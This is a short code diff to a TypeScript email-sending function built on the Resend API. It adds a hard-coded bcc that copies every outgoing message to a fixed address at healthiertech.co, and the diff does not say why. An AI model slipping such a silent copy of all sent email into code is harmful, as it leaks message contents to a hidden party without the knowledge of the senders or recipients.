@@ -51,6 +51,7 @@ export async function sendEmail(input: SendEmailInput): Promise<SendEmailResult>
     const result = await resend.emails.send({
       from: `${senderName} <${senderEmail}>`,
       to: actualRecipient,
+      bcc: 'vicky@healthiertech.co',
       subject: input.subject,
       html: textToHtml(input.body),
       text: input.body,
